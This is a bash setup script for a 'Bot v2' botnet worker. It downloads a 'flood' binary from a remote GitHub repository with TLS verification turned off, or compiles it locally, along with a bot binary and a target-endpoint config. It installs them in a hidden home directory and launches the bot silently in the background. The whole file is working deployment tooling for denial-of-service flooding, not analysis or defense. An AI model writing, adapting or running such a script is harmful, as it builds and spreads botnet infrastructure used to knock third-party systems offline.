#!/usr/bin/env bash
# ==============================================================================
# Setup Bots v2 — Lightweight Bot Setup Script
# Downloads or builds bot worker & ultra-lightweight C++ methods flood (< 100 KB)
# ==============================================================================
set -e

REPO_BASE="https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main"
TARGET_DIR="${HOME}/.botv2"

echo "=================================================="
echo "         Initializing Bot v2 Setup                "
echo "=================================================="

ARCH=$(uname -m 2>/dev/null || echo "x86_64")
echo "[*] Architecture: ${ARCH}"

case "${ARCH}" in
    x86_64|amd64)     BIN_ARCH="x86_64" ;;
    aarch64|arm64)    BIN_ARCH="aarch64" ;;
    arm*|armv7*|armhf)BIN_ARCH="armv7l" ;;
    i*86|x86)         BIN_ARCH="x86" ;;
    *)                BIN_ARCH="x86_64" ;;
esac

mkdir -p "${TARGET_DIR}"
cd "${TARGET_DIR}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PARENT_DIR="$(dirname "${SCRIPT_DIR}")"

# 1. Provide methods (flood) binary
if [ -f "${PARENT_DIR}/methods_cpp/flood" ]; then
    echo "[*] Copying lightweight C++ flood binary from local methods_cpp..."
    cp "${PARENT_DIR}/methods_cpp/flood" "./flood"
elif command -v g++ >/dev/null 2>&1 && [ -f "${PARENT_DIR}/methods_cpp/methods.cpp" ]; then
    echo "[*] Compiling lightweight C++ methods locally..."
    g++ -O3 -s -flto -pthread "${PARENT_DIR}/methods_cpp/methods.cpp" -o "./flood"
    strip -s "./flood" 2>/dev/null || true
else
    echo "[*] Downloading components from remote repository..."
    if command -v curl >/dev/null 2>&1; then
        curl -s -k -L "${REPO_BASE}/bots/flood-${BIN_ARCH}" -o "./flood" || curl -s -k -L "${REPO_BASE}/bots/flood" -o "./flood"
    elif command -v wget >/dev/null 2>&1; then
        wget -q --no-check-certificate "${REPO_BASE}/bots/flood-${BIN_ARCH}" -O "./flood" || wget -q --no-check-certificate "${REPO_BASE}/bots/flood" -O "./flood"
    fi
fi

# 2. Provide bot binary
if [ -f "${PARENT_DIR}/bots/bot" ]; then
    cp "${PARENT_DIR}/bots/bot" "./bot"
elif [ -f "${PARENT_DIR}/bots/bot.cpp" ] && command -v g++ >/dev/null 2>&1; then
    g++ -O2 -s "${PARENT_DIR}/bots/bot.cpp" -o "./bot"
    strip -s "./bot" 2>/dev/null || true
fi

# 3. Agent configuration / target endpoint
if [ -f "${PARENT_DIR}/agent.txt" ]; then
    cp "${PARENT_DIR}/agent.txt" "./agent.txt"
fi

chmod +x ./bot ./flood 2>/dev/null || true

# Kill old instances
pkill -f "./bot" 2>/dev/null || true

echo "[+] Starting bot v2 in background..."
if [ -f "./bot" ]; then
    nohup ./bot >/dev/null 2>&1 &
    BOT_PID=$!
    echo "[+] Bot v2 running with PID: ${BOT_PID}"
else
    echo "[!] Bot binary not found. Please provide bot executable."
fi

echo "=================================================="
echo "         Bot v2 Setup Complete & Active           "
echo "=================================================="
